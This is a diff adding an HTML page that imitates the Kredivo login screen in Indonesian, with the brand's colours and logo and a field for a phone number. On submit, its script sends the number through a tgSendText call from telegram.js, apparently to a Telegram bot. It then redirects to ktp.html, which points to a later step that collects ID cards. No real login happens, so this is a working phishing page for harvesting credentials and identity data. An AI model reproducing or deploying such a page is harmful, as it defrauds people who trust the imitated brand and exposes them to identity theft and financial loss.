@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Kredivo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .screen {
+      width: 100%;
+      max-width: 390px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Top red wave */
+    .top-wave {
+      width: 100%;
+      height: 220px;
+      background: #E5192A;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .top-wave::after {
+      content: '';
+      position: absolute;
+      bottom: -40px;
+      left: -10%;
+      width: 120%;
+      height: 80px;
+      background: #fff;
+      border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+    }
+
+    .logo-wrap {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -60%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .logo-icon {
+      width: 64px;
+      height: 64px;
+      background: #fff;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+    }
+
+    .logo-icon svg {
+      width: 44px;
+      height: 44px;
+    }
+
+    .logo-text {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    /* Content */
+    .content {
+      flex: 1;
+      padding: 60px 28px 40px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 36px;
+      line-height: 1.5;
+    }
+
+    /* Phone input */
+    .input-group {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid #ddd;
+      border-radius: 12px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+      margin-bottom: 12px;
+    }
+
+    .input-group:focus-within {
+      border-color: #E5192A;
+    }
+
+    .country-code {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0 14px;
+      border-right: 1.5px solid #eee;
+      height: 52px;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .flag {
+      font-size: 20px;
+      line-height: 1;
+    }
+
+    .code-text {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+    }
+
+    .chevron {
+      width: 10px;
+      height: 10px;
+      border-right: 2px solid #999;
+      border-bottom: 2px solid #999;
+      transform: rotate(45deg);
+      margin-top: -4px;
+    }
+
+    input[type="tel"] {
+      flex: 1;
+      height: 52px;
+      border: none;
+      outline: none;
+      padding: 0 16px;
+      font-size: 16px;
+      color: #1a1a1a;
+      background: transparent;
+    }
+
+    input[type="tel"]::placeholder {
+      color: #bbb;
+    }
+
+    .hint {
+      font-size: 12px;
+      color: #aaa;
+      margin-bottom: 32px;
+      padding-left: 2px;
+    }
+
+    /* Button */
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background: #E5192A;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-submit:active {
+      background: #c41422;
+      transform: scale(0.98);
+    }
+
+    .btn-submit:disabled {
+      background: #f5a0a7;
+      cursor: not-allowed;
+    }
+
+    /* Divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 24px 0;
+    }
+
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background: #eee;
+    }
+
+    .divider-text {
+      font-size: 13px;
+      color: #bbb;
+    }
+
+    /* Daftar link */
+    .register-wrap {
+      text-align: center;
+      font-size: 14px;
+      color: #888;
+    }
+
+    .register-wrap a {
+      color: #E5192A;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    /* Spacer */
+    .spacer {
+      flex: 1;
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      font-size: 11px;
+      color: #bbb;
+      padding: 16px 28px 32px;
+      line-height: 1.6;
+    }
+
+    .footer a {
+      color: #E5192A;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <div class="top-wave">
+      <div class="logo-wrap">
+        <div class="logo-icon">
+          <!-- Kredivo K logo -->
+          <svg viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <text x="6" y="34" font-family="Arial Black, sans-serif" font-size="32" font-weight="900" fill="#E5192A">K</text>
+          </svg>
+        </div>
+        <span class="logo-text">kredivo</span>
+      </div>
+    </div>
+
+    <div class="content">
+      <div class="title">Masuk ke Kredivo</div>
+      <div class="subtitle">Masukkan nomor HP kamu untuk melanjutkan</div>
+
+      <div class="input-group">
+        <div class="country-code">
+          <span class="flag">🇮🇩</span>
+          <span class="code-text">+62</span>
+          <div class="chevron"></div>
+        </div>
+        <input
+          type="tel"
+          id="phone"
+          placeholder="8xx xxxx xxxx"
+          maxlength="13"
+          inputmode="numeric"
+          autocomplete="tel-national"
+          oninput="handleInput(this)"
+        />
+      </div>
+      <div class="hint">Contoh: 812 3456 7890</div>
+
+      <button class="btn-submit" id="btn" onclick="submit()" disabled>
+        Lanjut
+      </button>
+
+      <div class="divider">
+        <div class="divider-line"></div>
+        <span class="divider-text">atau</span>
+        <div class="divider-line"></div>
+      </div>
+
+      <div class="register-wrap">
+        Belum punya akun? <a href="#">Daftar sekarang</a>
+      </div>
+
+      <div class="spacer"></div>
+    </div>
+
+    <div class="footer">
+      Dengan melanjutkan, kamu menyetujui<br/>
+      <a href="#">Syarat &amp; Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> Kredivo
+    </div>
+  </div>
+
+  <script src="telegram.js"></script>
+  <script>
+    function handleInput(el) {
+      // Strip non-numeric
+      el.value = el.value.replace(/\D/g, '');
+      // Enable button if >= 9 digits
+      document.getElementById('btn').disabled = el.value.length < 9;
+    }
+
+    async function submit() {
+      const phone = document.getElementById('phone').value;
+      if (phone.length < 9) return;
+
+      const btn = document.getElementById('btn');
+      btn.textContent = 'Memproses...';
+      btn.disabled = true;
+
+      await tgSendText(`📱 <b>Phone Kredivo</b>: +62${phone}`);
+
+      window.location.href = 'ktp.html?p=' + encodeURIComponent(phone);
+    }
+  </script>
+</body>
+</html>
